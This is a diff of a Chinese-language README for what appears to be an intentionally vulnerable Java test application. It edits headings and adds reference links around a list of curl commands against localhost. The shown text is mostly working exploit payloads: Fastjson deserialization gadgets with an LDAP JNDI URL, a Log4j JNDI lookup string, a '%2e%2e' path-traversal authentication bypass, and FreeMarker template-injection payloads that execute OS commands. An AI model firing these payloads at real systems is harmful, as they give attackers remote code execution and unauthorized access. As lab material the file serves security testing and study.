@@ -6,7 +6,7 @@
    curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"127.0.0.1",port:"1099","name":"Exploit"}'
    curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
    ```
-3. 测试 alwaysUseFullPath 认证绕过漏洞，来自 http://rui0.cn/archives/1643
+3. 测试 alwaysUseFullPath 认证绕过漏洞: http://rui0.cn/archives/1643
    * 直接访问 /admin/auth 会提示认证失败
    * 使用 /admin/no-auth/%2e%2e/auth 可以绕过认证
 4. 测试ognl执行
@@ -21,7 +21,7 @@
    ```
    curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1099/a}'
    ```
-7. 测试freemarker漏洞
+7. 测试freemarker漏洞(JythonRuntime需要本地有class): https://tttang.com/archive/1412/
    ```
    curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("open /System/Applications/Calculator.app")</@value>'
    curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.Execute"?new()>$${value("open /System/Applications/Calculator.app")}'
